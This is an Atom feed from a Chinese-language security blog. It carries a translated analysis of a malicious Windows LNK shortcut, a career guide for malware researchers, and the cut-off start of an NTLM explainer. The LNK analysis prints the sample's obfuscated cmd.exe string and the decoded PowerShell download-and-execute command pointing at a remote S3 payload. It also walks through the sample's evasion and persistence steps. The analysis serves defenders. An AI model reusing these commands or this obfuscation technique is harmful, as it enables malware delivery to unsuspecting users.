<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://security-onigiri.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://security-onigiri.github.io//" rel="alternate" type="text/html" /><updated>2019-03-23T16:19:31+08:00</updated><id>https://security-onigiri.github.io//feed.xml</id><entry><title type="html">看我如何分析 Windows LNK 檔案攻擊</title><link href="https://security-onigiri.github.io//2019/03/23/windows-lnk.html" rel="alternate" type="text/html" title="看我如何分析 Windows LNK 檔案攻擊" /><published>2019-03-23T00:00:00+08:00</published><updated>2019-03-23T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2019/03/23/windows-lnk</id><content type="html" xml:base="https://security-onigiri.github.io//2019/03/23/windows-lnk.html">&lt;h1 id=&quot;看我如何分析-windows-lnk-檔案攻擊&quot;&gt;&lt;strong&gt;看我如何分析 Windows LNK 檔案攻擊&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;翻譯文章來源:&lt;/strong&gt; dexters-lab.net&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;原文&lt;/strong&gt;：https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/&lt;/p&gt;

&lt;p&gt;最近我的一個朋友分享了一個有趣的惡意樣本，它是一個微軟捷徑檔（LNK檔案），點擊（執行）後導致感染，在研究之前我並不知道2017的時候就有這樣的攻擊手法，這種類型的攻擊也有所增加，我感到很驚訝。
在這篇文章中，我們將分析 LNK 檔案惡意軟體並揭示攻擊者如何使用多層混淆來逃避 AV 並最終丟棄惡意二進制檔案，我們還將研究如何對每個層進行去解混淆，並了解代碼正在做什麼。&lt;/p&gt;

&lt;h2 id=&quot;動機&quot;&gt;&lt;strong&gt;動機&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;令我感興趣的原因是因為樣本本身看起來十分無辜，以及從社交工程的角度看它是多麼有說服力。作為一個捷徑，它對普通用戶來說並不可疑，因為它不是EXE。接下來，當用戶點擊時，會彈出一個瀏覽器視窗，它會打開鏈接 &lt;a href=&quot;https://get.adobe.com/br/flashplayer/&quot;&gt;https://get.adobe.com/br/flashplayer/&lt;/a&gt; 這會讓用戶認為他的系統中缺少一個flash插件，這就是為什麼他無法打開/執行該檔案，但一旦他安裝了 Flash 播放器，當他再次嘗試打開捷徑且意識到它只是一個垃圾檔案時，已經太晚了。&lt;/p&gt;

&lt;p&gt;但實際發生的是它在背景中通過 shell 命令執行 Powershell 命令來下載 Powershell 腳本，該腳本執行主要惡意檔案的實際下載和安裝。它下載的檔案是一個 BMP 檔案，它看起來是一個無辜的圖像檔案，但它實際上是一個偽裝的 Powershell 檔案。&lt;/p&gt;

&lt;h2 id=&quot;什麼是lnk檔案&quot;&gt;&lt;strong&gt;什麼是LNK檔案？&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;LNK 是 Microsoft Windows 用於指向可執行檔案或應用程序的捷徑方式檔案的檔案副檔名。LNK 檔案通常用於創建開始菜單和桌面快捷方式。LNK代表LiNK。LNK檔案可以通過更改圖標偽裝成合法檔案，但在此案例並沒有完成。&lt;/p&gt;

&lt;h2 id=&quot;基本分析&quot;&gt;&lt;strong&gt;基本分析&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;以下是一般檔案屬性的外觀。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/file-type.png&quot;&gt;&lt;img src=&quot;https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/file-type.png&quot; alt=&quot;&quot; title=&quot;惡意鏈接檔案&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;看一下_Shortcut_選項卡會給我們提供更多細節，下面是它的樣子。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/lnk-file-target.png&quot;&gt;&lt;img src=&quot;https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/lnk-file-target.png&quot; alt=&quot;&quot; title=&quot;LNK檔案定位應用程序&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;正如您在 Target 欄位中看到的那樣，它指向 cmd.exe 並帶有一些參數。這是在執行此 LNK 檔案時運行的命令。但這不是整個命令。&lt;br /&gt;
捷徑的 Target 欄位最大為260個字元。任何比這更長的內容都不可見。但是 command line 參數的最大長度為 4096 個字符，因此我們無法在上面的窗口中看到整個命令。我必須用另一個工具來提取整個命令。&lt;/p&gt;

&lt;h2 id=&quot;深入研究-lnk-檔案格式&quot;&gt;&lt;strong&gt;深入研究 LNK 檔案格式&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;使用 LNK 檔案分析工具，我們可以設法獲得整個嵌入在檔案裏面的命令，如下所示&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/lnk-file-cmd-report.png&quot;&gt;&lt;img src=&quot;https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/lnk-file-cmd-report.png&quot; alt=&quot;&quot; title=&quot;Extracting command from LNK file&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;根據上面提取出的 LNK 檔案內容我們可以找到一些有趣的欄位：
| KEY | VALUE |
| — | — |
| Relative path | ..\..\..\..\Windows\system32\cmd.exe |
| Working Directory | %SystemRoot%\System32 |
| Arguments | /V /C set x4OAGWfxlES02z6NnUkK=2whttpr0&amp;amp;&amp;amp;… |&lt;/p&gt;

&lt;p&gt;讓我們仔細看看 Arguments，如下所示：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;c:\\Windows\\system32\\cmd.exe /V /C set x4OAGWfxlES02z6NnUkK=2whttpr0&amp;amp;&amp;amp;set L1U03HmUO6B9IcurCNNlo4=.com&amp;amp;&amp;amp; echo | start %x4OAGWfxlES02z6NnUkK:~2,4%s://get.adobe%L1U03HmUO6B9IcurCNNlo4%/br/flashplayer/ &amp;amp;&amp;amp;set aZM4j3ZhPLBn9MpuxaO= -win 1 &amp;amp;&amp;amp;set MlyavWfE=ndows&amp;amp;&amp;amp;set jA8Axao1xcZ=iEx&amp;amp;&amp;amp;set WMkgA3uXa1pXx=tRi&amp;amp;&amp;amp;set KNhGmAqHG5=bJe&amp;amp;&amp;amp;set 4kxhaz6bqqKC=LOad&amp;amp;&amp;amp;set rwZCnSC7T=nop&amp;amp;&amp;amp;set jcCvC=NEw&amp;amp;&amp;amp;set ZTVZ=wEbc&amp;amp;&amp;amp;set DABThzRuTT2hYjVOy=nt).dow&amp;amp;&amp;amp;set cwdOsPOdA08SZaXVp1eFR=t NeT.&amp;amp;&amp;amp;set Rb=Ers&amp;amp;&amp;amp;set j4HfRAqYXcRZ3R=hEll&amp;amp;&amp;amp;set Kpl01SsXY5tthb1=.bmp&amp;amp;&amp;amp;set vh7q6Aq0zZVLclPm=\\v1.0\\&amp;amp;&amp;amp;set 2Mh=pOw&amp;amp;&amp;amp;set 8riacao=%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%&amp;amp;&amp;amp;@echo off &amp;amp;&amp;amp; %SystemDrive% &amp;amp;&amp;amp; cd\ &amp;amp;&amp;amp; cd %SystemRoot%\\System32 &amp;amp;&amp;amp;echo %jA8Axao1xcZ%(&quot;%jA8Axao1xcZ%(!jcCvC!-o%KNhGmAqHG5%c!cwdOsPOdA08SZaXVp1eFR!!ZTVZ!Lie!DABThzRuTT2hYjVOy!n%4kxhaz6bqqKC%S%WMkgA3uXa1pXx%NG('%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%')&quot;); | Wi!MlyavWfE!!2Mh!!Rb!!j4HfRAqYXcRZ3R!!vh7q6Aq0zZVLclPm!!2Mh!!Rb!!j4HfRAqYXcRZ3R! -!rwZCnSC7T!!aZM4j3ZhPLBn9MpuxaO! -  &amp;gt;

set x4OAGWfxlES02z6NnUkK=2whttpr0
set L1U03HmUO6B9IcurCNNlo4=.com
echo | start         %x4OAGWfxlES02z6NnUkK:~2,4%s://get.adobe%L1U03HmUO6B9IcurCNNlo4%/br/flashplayer/
set aZM4j3ZhPLBn9MpuxaO= -win 1
set MlyavWfE=ndows
set jA8Axao1xcZ=iEx
set WMkgA3uXa1pXx=tRi
set KNhGmAqHG5=bJe
set 4kxhaz6bqqKC=LOad
set rwZCnSC7T=nop
set jcCvC=NEw
set ZTVZ=wEbc
set DABThzRuTT2hYjVOy=nt).dow
set cwdOsPOdA08SZaXVp1eFR=t NeT.
set Rb=Ers
set j4HfRAqYXcRZ3R=hEll
set Kpl01SsXY5tthb1=.bmp
set vh7q6Aq0zZVLclPm=\\v1.0\\
set 2Mh=pOw
set 8riacao=%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%
@echo off
%SystemDrive%
cd\\
cd %SystemRoot%\\System32
echo %jA8Axao1xcZ%(&quot;%jA8Axao1xcZ%(!jcCvC!-o%KNhGmAqHG5%c!cwdOsPOdA08SZaXVp1eFR!!ZTVZ!Lie!DABThzRuTT2hYjVOy!n%4kxhaz6bqqKC%S%WMkgA3uXa1pXx%NG('%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%')&quot;); | Wi!MlyavWfE!!2Mh!!Rb!!j4HfRAqYXcRZ3R!!vh7q6Aq0zZVLclPm!!2Mh!!Rb!!j4HfRAqYXcRZ3R! -!rwZCnSC7T!!aZM4j3ZhPLBn9MpuxaO! --%ProgramFiles%\\Internet Explorer\\iexplore.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;每一行都是shell命令。第一行是設置一些環境變數然後在第3行，最後一行使用這些環境變數來組裝這些變量並執行它們。這種組裝和反組譯變數名的方法使代碼更難閱讀。&lt;/p&gt;

&lt;p&gt;上面混淆的 shell 腳本解碼為以下兩個命令：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\system32\cmd.exe /V /C set x4OAGWfxlES02z6NnUkK=2whttpr0&amp;amp;&amp;amp;set L1U03HmUO6B9IcurCNNlo4=.com &amp;amp;&amp;amp; echo | start https://get.adobe.com/br/flashplayer/&lt;/code&gt; 此命令在瀏覽器打開adobe flashplayer安裝頁面。&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;echo iEx(&quot;iEx(New-Object Net.WebClient).DownloadString('hxxps://s3-eu-west-1.amazonaws.com/juremasobra2/jureklarj934t9oi4.bmp')&quot;); | WindowsPowershell\v1.0\Powershell -nop -win 1 --%ProgramFiles%\\Internet Explorer\\iexplore.exe&lt;/code&gt; 這個命令實際下載了第二層 Powershell ，該檔案偽裝成 URL 中的 BMP 檔案&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;解碼第二層-powershell&quot;&gt;&lt;strong&gt;解碼第二層 Powershell&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;由上面的LNK檔案下載的Powershell腳本可以在此&lt;a href=&quot;https://github.com/d3xt3rsl4b/analyzed-malware/blob/master/lnk_malware/jureklarj934t9oi4.ps1&quot;&gt;點我&lt;/a&gt; fd60a8b790b42f0c416c28e4ad22dc317ad8fbc5 上找到，它被嚴重混淆，使用&lt;a href=&quot;http://www.powertheshell.com/obfuscationmode/&quot;&gt;ISESteriods&lt;/a&gt;進行混淆。我確實設法解碼腳本，可以在此&lt;a href=&quot;https://github.com/d3xt3rsl4b/analyzed-malware/blob/master/lnk_malware/decoded.ps1&quot;&gt;點我&lt;/a&gt;上找到可讀代碼。&lt;/p&gt;

&lt;p&gt;執行腳本執行以下操作：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;檢查它是否在虛擬機內部運行，如果它正在運行，則它不執行其餘命令並退出。否則，它將處理為後續步驟。該腳本檢查以下虛擬機列表：
    &lt;ol&gt;
      &lt;li&gt;VirtualBox的&lt;/li&gt;
      &lt;li&gt;VMware虛擬平台&lt;/li&gt;
      &lt;li&gt;虛擬機&lt;/li&gt;
      &lt;li&gt;HVM domU&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;然後它創建一個名為 444444444444 的 Mutex，這是為了確保該電腦只運行一個這個程序。&lt;/li&gt;
  &lt;li&gt;如果上一步成功，則下載一個zip，再次偽裝成一個圖像檔案，來自以下URL hxxps：//s3-eu-west-1[.]amazonaws[.]com/juremasobra2/image2.png，Hash 即887eafc19419df5119a829fd05d898503b7a0217”&lt;/li&gt;
  &lt;li&gt;將PNG檔案重命名為ZIP檔案&lt;/li&gt;
  &lt;li&gt;從包含DLL 92be09ca93ad6a8b04b7e2e2087fc6884fef1f63 的zip檔案中提取內容，並將此檔案複製到啟動資料夾。&lt;/li&gt;
  &lt;li&gt;然後它通過在 Startup 資料夾中創建捷徑方式檔案來讓它能夠繼續存在電腦裡面，此快捷方式檔案（第二個 LNK）在命令 shell 中調用 run32.dll 來運行惡意 DLL 二進制檔案。由於 run32.dll 是一個內置的簽名二進制檔案，因此不會引起更多懷疑。例如，此命令 &lt;em&gt;rundll32.exe shell32.dll，ShellExec_RunDLL notepad.exe&lt;/em&gt; 將啟動 notepad.exe。&lt;/li&gt;
  &lt;li&gt;然後腳本會停留 40 秒，然後重新啟動機器。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;通過上述攻擊，技術攻擊者試圖將其惡意DLL二進制檔案隱藏在合法二進制檔案後面。&lt;/p&gt;

&lt;p&gt;可以在此&lt;a href=&quot;https://blogs.technet.microsoft.com/motiba/2017/11/04/chasing-adversaries-with-autoruns-evading-techniques-and-countermeasures/&quot;&gt;鏈接&lt;/a&gt;上找到有關這手法的更多信息&lt;/p&gt;

&lt;h2 id=&quot;所有的檔案&quot;&gt;&lt;strong&gt;所有的檔案&lt;/strong&gt;&lt;/h2&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;SHA1&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;af6df15050dea1a756bb99bb0597d7072c2aee4c&lt;/td&gt;
      &lt;td&gt;惡意 LNK 檔案&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;fd60a8b790b42f0c416c28e4ad22dc317ad8fbc5&lt;/td&gt;
      &lt;td&gt;Powershell 檔案由上述 LNK 下載&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;887eafc19419df5119a829fd05d898503b7a0217&lt;/td&gt;
      &lt;td&gt;ZIP 檔案由上述 Powershell 下載&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;92be09ca93ad6a8b04b7e2e2087fc6884fef1f63&lt;/td&gt;
      &lt;td&gt;惡意 DLL 檔案由上述 ZIP 檔案解開&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;參考&quot;&gt;&lt;strong&gt;參考&lt;/strong&gt;&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.dfir.training/windows/lnk/116-windows-shortcut-file-lnk-format/file&quot;&gt;LNK file format&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://securitynews.sonicwall.com/xmlpost/lnk-file-is-actively-being-leveraged-to-run-file-less-powershell-script/&quot;&gt;Other attacks similar to this&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.trendmicro.com/trendlabs-security-intelligence/rising-trend-attackers-using-lnk-files-download-malware/&quot;&gt;TreadMicro blog no treads on this type of attacks&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</content><author><name>JohnThunder</name></author><category term="Malware" /><category term="DFIR" /><summary type="html">看我如何分析 Windows LNK 檔案攻擊</summary></entry><entry><title type="html">如何當個貓ware研究者</title><link href="https://security-onigiri.github.io//2018/12/09/ware.html" rel="alternate" type="text/html" title="如何當個貓ware研究者" /><published>2018-12-09T00:00:00+08:00</published><updated>2018-12-09T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/12/09/ware</id><content type="html" xml:base="https://security-onigiri.github.io//2018/12/09/ware.html">&lt;h1 id=&quot;how-to-become-and-remain-a-malware-researcher&quot;&gt;How to Become (and Remain) a Malware Researcher&lt;/h1&gt;

&lt;p&gt;I am writing this post as requested by Peerlyst. In this post, I will present my unique take on both becoming and remaining a Malware Researcher.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我應 Peerlyst 要求寫這篇文章，內容將包含如何成為並持續當一個惡意軟體研究員。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;the-two-most-important-ingredients--兩個最關鍵的要素&quot;&gt;The Two Most Important Ingredients / 兩個最關鍵的要素&lt;/h2&gt;

&lt;p&gt;My take is that there are two most important ingredients to becoming a malware researcher:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Obsessive Passion to learn “how things work” no matter the time commitment and effort required; aka insatiable curiosity.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Ability to enjoy working at a solitary job where much of it is between you the code&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
  &lt;p&gt;要想當一個惡意軟體研究員，我有兩個關鍵的小撇步:&lt;/p&gt;
  &lt;ol&gt;
    &lt;li&gt;對於事物的運作原理有著異常的癡迷，無論需要多耗時費力; 又稱無止盡好奇心&lt;/li&gt;
    &lt;li&gt;可以忍受獨立作業，單獨面對冷冰冰的程式碼&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;The fact is, malware research requires a lot of specialized knowledge, skills, and can be very challenging. It is far from impossible, but the type of challenges and work required will naturally weed out people who are not really into it or passionate about it. However, obsessive passion and curiosity will drive an anaylyst to crack anything eventually. So step 1 is, set up an analysis environmnet, grab some malware from a repository, and give it a shot. Is this something that you really enjoy ? Is it something you could see yourself doing all day every day and for countless hours on end ? The answser for me was that I would start analyzing malware and the next thing I knew, I’d look at the clock and it would be 5-8 hours later and I still didn’t wnat to stop. This was an important factor in my decision to pursue malware research professionally.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;研究惡意軟體需要非常多的專業知識與技巧，且非常具有挑戰性。這種挑戰可以自然的淘汰掉那些並不是真心投入或是沒熱誠的人。而那種無止盡的熱情與好奇心將驅使一個分析員將所有東西都拆過一輪。所以第一步是建立分析環境，搞點惡意軟體並試著玩弄一番。你真的能樂在其中?你真的能這樣搞他個三天三夜?我的答案是，當我開始分析惡意軟體通常都是五到八個小時起跳，並且我還停不下來。在追求惡意軟體分析專家的道路上，這是至關重要的因素。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;how-to-learn--怎麼學&quot;&gt;How to learn / 怎麼學&lt;/h2&gt;

&lt;p&gt;So let’s say you share the passion and you are now wanting to know exactly how I would recommend taking further steps. Here are the steps I recommend:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;讓我們假定你頗具熱情然後你想要讓我建議下一步該怎麼走，我的建議如下:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;If you don’t already know how to program software, you should learn. I recommend learning Pyhotn, C, and x86-64 assembly or ARM if you wnat to do phone malware. If you can fully understand and use just those three languages, you will understand general software very well.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;Analyze malware in a lab using the common tools&lt;/li&gt;
  &lt;li&gt;Read books on malware (and “virus”) analysis, programming, and operating systems both general and specific&lt;/li&gt;
  &lt;li&gt;Read technical blogs and follow other researchers on Twitter, keeping up with their work&lt;/li&gt;
  &lt;li&gt;Attend conferences such as DEFCON and REcon&lt;/li&gt;
  &lt;li&gt;Attend (or create) meetups in your area for malware analysis or InfoSec.&lt;/li&gt;
  &lt;li&gt;Watch YouTube channels like L!NK, MalareAnalysisForHedgehogs, Colin Hardy, hasherezade, OALabs, and Gynvael Coldwind&lt;/li&gt;
  &lt;li&gt;Help others and ask questions on https://reverseengineering.stackexchange.com&lt;/li&gt;
  &lt;li&gt;Don’t forget to keep programming. Even if you don’t have to actually write code each day as a malware researcher, it’s important to keep those skills up so you can automate reversing tasks, and continue to think like a regular software engineer as well.&lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;如果你還不會寫程式，我建議學 Python, C 跟 x86-64 組合語言，如果要研究手機惡意程式的話再學個 ARM。如果你能很好的搞懂這三個語言，那應該也可以很好的理解一般的軟體。&lt;/li&gt;
    &lt;li&gt;學會用一些常見的[工具]&amp;gt;(https://toddcullumresearch.com/2017/07/01/todds-giant-intro-of-windows-malware-analysis-tools/)分析惡意軟體&lt;/li&gt;
    &lt;li&gt;閱讀關於分析惡意軟體、病毒、程式與作業系統的書&lt;/li&gt;
    &lt;li&gt;閱讀部落格或Twitter上的技術文章，試著跟上他們的腳步&lt;/li&gt;
    &lt;li&gt;參加研討會像是 DEFCON 或 REcon&lt;/li&gt;
    &lt;li&gt;參加或是自己辦與惡意軟體或資安相關的小聚&lt;/li&gt;
    &lt;li&gt;看 YouTube 頻道上的教學，像是 L!NK, MalwareAnalysisForHedgehogs, Colin Hardy, hasherezade, OALabs, 和 Gynvael Coldwind&lt;/li&gt;
    &lt;li&gt;在 https://reverseengineering.stackexchange.com/ 上問問題或是回答他人問題&lt;/li&gt;
    &lt;li&gt;別忘了學寫程式。就算你不用每天寫程式也能成為一個惡意軟體研究者，但保持精進寫程式的技巧，像一個軟體工程師一樣思考，有助於自動化逆向分析工作&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;In a nutshell, that all will get you very , very far and if dont right, it won’t cost you a whole lot of money. It will cost you lot of time though, so be ready for that. I don’t post out the specifics in this blog on which books to read because I’ve already listed resources in another post, so check it out.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;簡而言之，這雖然還離你很遠，但這並不會花到你一毛錢，而是需要很多時間，我沒寫出要追那些部落格或書，因為我已經在&lt;a href=&quot;https://malwareanalysisforums.com/topic/7/malware-analysis-resources-noobs-read-first/2&quot;&gt;這邊&lt;/a&gt;羅列過這些資源了，可以去看看。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;becoming-a-professional--成為一個專家&quot;&gt;Becoming a professional / 成為一個專家&lt;/h2&gt;

&lt;p&gt;In order to become a professional, it’s very helpful to show off some of your work. This both shows your quality of work and where you’re at, and it shows off your passion and love of malware analysis. One of the cool things about this field is that you can analyze as much malware as you wnat in your free time and create write-ups and videos, then post them up on a blog or YouTube. This allows you to effectively “work” even when you are not a professional yet and you can show off this work to using a programming language and put it up on GitHub. This will not only benefit the community and allow you to improve your coding skills, but it will gain you exposure and is more work you could show to a prospective employer. Certifications sometimes have their place, but I am not the only one who feels that demonstrated, tangible work like this is more valuable and the nice thing is it doesn’t cost $1,000-$5,000 either!&lt;/p&gt;

&lt;p&gt;為了成為一個專家，顯擺一下你的成果是非常必要的，一方面顯示一下你的程度，一方面展現你對惡意軟體分析的愛與熱情。你還能在閒暇之餘隨心所欲的分析惡意軟體，並上傳至 YouTube 或是部落格上分享你的分析結果。你也可以把相關的程式碼上傳至 GitHub，儘管你還不是一個專家，這將對你的工作有相當的效益。這不只是對社群有助益，同時也能改善你寫程式的技巧與增進對潛在雇主的曝光度。不能說證照沒用，但我不是唯一一個認為實際操作經驗等是更為有價值的，至少他不會花你個一千五千的。&lt;/p&gt;

&lt;h2 id=&quot;remaining-a-professional-and-being-skilled--持續當一個熟練的專家&quot;&gt;Remaining a professional and being skilled / 持續當一個熟練的專家&lt;/h2&gt;

&lt;p&gt;Malware Reasearch is a job that requires constantly learning and honing of skills. Not only is there a huge breadth of knowlege which applies, but there are often new trends, threats, and attacks which are introduced each year. Likewise though, it’s important to understand the foundational basics and refresh yourself on them so that you don’t get caught worrying too much about the trendy threats and let a 10-year-old attack technique slip right by you. For these reasons, plan on always reading books, blogs, and papers indefinitely, and honing your coding and reversing skills. The learning doesn’t ever stop.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;惡意軟體研究是一份需要持續學習及磨練技巧的工作。並不僅止於廣泛的應用知識層面，且每年都有新的趨勢、威脅與攻擊樣態產生。同樣的，時常複習基礎知識是很重要的，這樣才不需要太擔心讓一些萬年老梗從你的面前溜過去。基於這些理由，無止盡的閱讀文章、部落格、論文，並磨練你的程式能力與逆向技巧。學無止盡。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I’ve found that it helps to take deep-dives on different subjects. For example, lately I’ve taken a deep dive on cryptography and the math behind it. While it in and of itself is not malware research, the current most popular and dangerous malware is ransomware which is completely based off of cryptography and the second most popular is bitcon miners, which also use cryptography. Examples of other subjects you could find yourself talking a deep dive on are specific exploits, operating system internals, specific malware types such as script-based malware, or research in the development of a tool. For example, Karsten Hahn from G-DATA wrote a master thesis on malware obstructing PE files in order to avoid detection and provided an accompanying software program to aid in analysis. So for this paper, there was a research compoment, a writing component, and a coding component.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我發現這能讓你更深入不同的領域，例如我最近把密碼學背後的原理跟數學都讀了一遍，雖然這跟惡意軟體研究沒有很直接的關係，但是現下最夯的惡意軟體就是勒索軟體，而勒索軟體完全就是基於密碼學的，第二熱門的比特幣挖礦程式也是基於密碼學原理的應用。其他主題可能跟特定漏洞、作業系統或是特定類型的惡意軟體(例如: 腳本型惡意軟體)，或是開發工具的研究。例如 G-DATA 的 Karsten Hahn 寫了一篇關於惡意軟體利用PE結構來避免被偵測的論文，並提供了相關的工具來幫助在分析中定位。在這篇論文中，有著研究部分、寫作部分及程式部分。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Another similar example is the work of Ange “Corkami” Albertini. Albertini is a Reverse Engineer at Google and he wrote papers and programs in his reasearch on the PE File Format. This research has been heavily used in the malware research community because malware often abusses this format to do its dirty work.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;另一個相似的例子是，Ange “Corkami” Albertini 的貢獻，Albertini 是在 Google 工作的逆向工程師，寫了數篇有關於PE結構的研究論文，該研究背廣泛應用在惡意軟體研究，因為惡意軟體常常透過濫用PE格式來做些壞壞的事情。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Other subjects that you could dive into include deobfuscation of malware code, unpacking malware, devirtualizing VM-protected malware, using machine-learning  algorithms to analyze malware, building a malware analysis sandbox like Cuckoo Sandbox or Joe Security Sandbox, etc …&lt;/p&gt;

&lt;p&gt;Endless fun! Hope this helped.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;其他你可以涉足的領域像是對惡意軟體的解混淆、脫殼、反虛擬化、使用機器學習演算法來分析惡意軟體、建造一個像 Cuckoo 或 Joe Security 的惡意軟體分析沙盒等等 …
好玩的不得了，希望這些對你們有幫助。&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>jhe</name></author><category term="Malware" /><summary type="html">How to Become (and Remain) a Malware Researcher</summary></entry><entry><title type="html">LM, NTLM, Net-NTLMv2 我的天呀！</title><link href="https://security-onigiri.github.io//2018/07/07/lm-ntlm-net-ntlmv2.html" rel="alternate" type="text/html" title="LM, NTLM, Net-NTLMv2 我的天呀！" /><published>2018-07-07T00:00:00+08:00</published><updated>2018-07-07T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/07/07/lm-ntlm-net-ntlmv2</id><content type="html" xml:base="https://security-onigiri.github.io//2018/07/07/lm-ntlm-net-ntlmv2.html">&lt;h1 id=&quot;lm-ntlm-net-ntlmv2-oh-my&quot;&gt;LM, NTLM, Net-NTLMv2, oh my!&lt;/h1&gt;

&lt;p&gt;When attacking AD, passwords are stored and sent in different ways, dependeing on both where you find it and the age of the domain. Most of these hashes are confusingly named, and both the hash name and the authentication protocol is named almost the same thing. It doesn’t help that every tool, post and guide that mentions credentials on Windows manage to add to the confusion. This is my attempt at clearing things up.&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;當攻擊 AD 時通行碼被用各種不同的方式儲存與傳送，視你在哪找到跟 domain 的年紀而定。大部分的雜湊的命名都很讓人疑惑，而且雜湊名稱與驗證協議幾乎是一樣的稱呼。在任何工具、文章及指南中提到 Windows 身分驗證資時更增加了困惑度。&lt;a href=&quot;https://xkcd.com/927/&quot;&gt;弄清楚些事情&lt;/a&gt;，是我的主要目的。&lt;/p&gt;
&lt;/blockquote&gt;

